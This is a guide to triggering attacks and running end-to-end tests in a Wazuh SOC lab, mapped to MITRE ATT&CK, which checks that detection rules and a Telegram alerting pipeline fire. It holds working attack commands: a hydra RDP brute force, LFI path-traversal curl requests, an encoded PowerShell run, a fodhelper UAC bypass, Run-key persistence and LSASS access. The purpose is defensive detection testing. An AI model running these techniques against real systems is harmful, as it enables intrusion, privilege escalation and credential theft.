# ⚔️ Attack Triggering & E2E Testing Guide

Detailed guide on triggering the 3 experimental attack scenarios and running end-to-end automated test suites in the Wazuh SOC Lab environment.

---

## 📌 Overview of Test Scenarios

| Scenario | Attack Target | MITRE ATT&CK Technique | Wazuh Detection Rule | Automated Host Runner Command |
| :--- | :--- | :--- | :--- | :--- |
| **Scenario 1** | RDP Brute Force | `T1110.001` (Password Guessing) | Rule `100001` (Single Fail), `100002` (Brute Force Detected) | `python tests/e2e/scenario_rdp_bruteforce.py --execute` |
| **Scenario 2** | Web Apache LFI | `T1190` (Exploit Public App) | Rule `87105` (Custom LFI Decoder `web-access-lfi`) | `python tests/e2e/scenario_lfi_web.py --execute` |
| **Scenario 3** | Full Kill Chain | `T1059.001`, `T1548.002`, `T1547.001`, `T1003.001` | Rule `100004`, `100007`, `100006`, `100005` (Sysmon) | `python tests/e2e/scenario_full_killchain.py --execute` |
| **SOAR Webhook** | Pipeline Test | N/A (E2E Integration) | Webhook Ingest $\rightarrow$ Threat Intel $\rightarrow$ Telegram | `python tests/e2e/test_soar_webhook.py` |
| **Lab Health** | Infrastructure | N/A (Connectivity) | Ping, SSH, WinRM, Docker Ports (443, 5678, 5985) | `python tests/e2e/lab_health.py` |

---

## 1. 🔍 Lab Infrastructure Health Check (Lab Healthcheck)

Before running any test suite, ensure all 3 virtual machines and their core services are running:

```powershell
# Run from the project root directory on the Windows Host:
python tests/e2e/lab_health.py
```

*Expected results:*
- ✅ `wazuh-vm` (192.168.71.128): Port 22 (SSH), Port 443 (Dashboard), Port 5678 (n8n) `[PASS]`
- ✅ `windows-vm` (192.168.71.129): Port 5985 (WinRM), Port 3389 (RDP), Port 80 (Apache) `[PASS]`
- ✅ `kali-vm` (192.168.71.130): Port 22 (SSH) `[PASS]`

---

## 2. 💥 Scenario 1: RDP Brute Force Attack & IP Blocking (Rule 100001 / 100002)

### Method A: Automated Execution via Python Runner (Recommended)
The runner automatically controls the Kali machine over SSH to send invalid RDP login attempts against Windows 10, then queries the Wazuh API to verify the alert:

```powershell
python tests/e2e/scenario_rdp_bruteforce.py --execute
```

### Method B: Manual Triggering from Kali Linux
```powershell
# Execute directly from host to Kali:
ssh kali-vm "hydra -l testw -P /usr/share/wordlists/metasploit/unix_passwords.txt rdp://192.168.71.129 -t 4 -V"
```
*Or use `xfreerdp` to trigger 8 attempts:*
```powershell
ssh kali-vm "for i in {1..8}; do xfreerdp /u:testw /p:WrongPass\$i /v:192.168.71.129 +auth-only; sleep 1; done"
```

### Response Verification:
```powershell
# 1. View Rule 100002 alert on Wazuh:
ssh wazuh-vm "docker exec single-node-wazuh.manager-1 grep '100002' /var/ossec/logs/alerts/alerts.json | tail -n 1 | jq ."

# 2. Check the firewall IP block rule on Windows Victim:
$cred = Get-Credential -UserName socrunner
Invoke-Command -ComputerName 192.168.71.129 -Credential $cred -ScriptBlock {
    Get-NetFirewallRule | Where-Object { $_.DisplayName -like "*WAZUH*" } | Select-Object DisplayName, Action, Enabled
}
```

---

## 3. 🌐 Scenario 2: Web Apache LFI Attack (Rule 87105)

### Prerequisites:
The Apache service (XAMPP) must be running on the Windows 10 machine (Port 80).

### Method A: Automated Execution via Python Runner
```powershell
python tests/e2e/scenario_lfi_web.py --execute
```

### Method B: Manual Triggering from Kali
```powershell
ssh kali-vm "curl -s -o /dev/null -w '%{http_code}\n' 'http://192.168.71.129/index.php?page=../../../../windows/win.ini'"
ssh kali-vm "curl -s -o /dev/null -w '%{http_code}\n' 'http://192.168.71.129/index.php?page=..%2f..%2f..%2f..%2fwindows%2fsystem.ini'"
```

### Decoder & Rule Verification:
```powershell
# View Rule 87105 alert in alerts.json:
ssh wazuh-vm "docker exec single-node-wazuh.manager-1 grep '87105' /var/ossec/logs/alerts/alerts.json | tail -n 1 | jq ."
```

---

## 4. 🥷 Scenario 3: Full Kill Chain Attack & Sysmon (Rule 100004 - 100007)

Simulates a 4-stage advanced attack chain following MITRE ATT&CK standards on the Windows 10 Endpoint.

### Method A: Automated Execution via Python Runner
```powershell
python tests/e2e/scenario_full_killchain.py --execute
```

### Method B: Step-by-Step Manual Execution via WinRM (`socrunner`)
```powershell
$cred = Get-Credential -UserName socrunner

# Stage 1: Execution (Base64 Encoded PowerShell - Rule 100004)
Invoke-Command -ComputerName 192.168.71.129 -Credential $cred -ScriptBlock {
    powershell.exe -enc VwByAGkAdABlAC0ASABvAHMAdAAgACIAVwBhAHoAdQBoAC0AUwBPAEMALQBLAGkAbABsAEMAaABhAGkAbgAtAFQAZQBzAHQAIgA=
}

# Stage 2: Privilege Escalation (UAC Bypass Fodhelper - Rule 100007)
Invoke-Command -ComputerName 192.168.71.129 -Credential $cred -ScriptBlock {
    New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(Default)" -Value "cmd.exe" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Start-Process -FilePath "C:\Windows\System32\fodhelper.exe"
}

# Stage 3: Persistence (Registry Run Key - Rule 100006)
Invoke-Command -ComputerName 192.168.71.129 -Credential $cred -ScriptBlock {
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WazuhLabPersistenceTest" -Value "C:\Windows\System32\cmd.exe /c whoami" -Force
}

# Stage 4: Credential Access (LSASS Memory Access - Rule 100005)
Invoke-Command -ComputerName 192.168.71.129 -Credential $cred -ScriptBlock {
    $proc = Get-Process lsass
    $handle = [System.Diagnostics.Process]::GetProcessById($proc.Id).Handle
    Write-Host "LSASS Queried handle: $handle"
}
```

---

## 5. 🤖 SOAR Automation & n8n Webhook Pipeline Testing

Validates that the n8n webhook ingest properly parses alerts and orchestrates Telegram ChatOps notifications:

```powershell
python tests/e2e/test_soar_webhook.py
```

*Test workflow:*
1. Generate simulated alert with `rule_id: 100007` (Critical UAC Bypass).
2. Send HTTP POST directly to `http://192.168.71.128:5678/webhook/wazuh-alert`.
3. Verify HTTP response status `200 OK`.
4. Open Telegram to check that bot `@my_wazuh_soc_alert_bot` sends an interactive alert message with 3 response action buttons.
